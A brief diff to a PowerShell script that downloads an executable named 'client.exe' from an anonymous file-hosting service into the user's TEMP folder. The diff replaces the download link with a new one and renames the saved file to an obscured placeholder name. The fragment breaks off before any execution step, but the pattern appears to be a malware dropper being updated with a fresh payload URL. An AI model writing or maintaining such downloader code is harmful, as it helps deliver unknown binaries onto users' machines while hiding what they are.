@@ -1,6 +1,5 @@
-$url = "https://cdn.storage.to/dd2c3432-4468-426a-8676-1f9344d29226?expires=1778622580&filename=client.exe&id=ICOFAPaLB&sig=3bb159bb44fe094c83bce1d2d099110437fba38240481ee2eb5b7c21120a97b6"
-
-$path = Join-Path $env:TEMP "client.exe"
+$url = "https://store-na-phx-5.gofile.io/download/web/3144a1f8-a97a-4d4d-9c4f-0b020ceb3b86/client.exe"
+$path = Join-Path $env:TEMP "xxxxxxxx.exe"
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
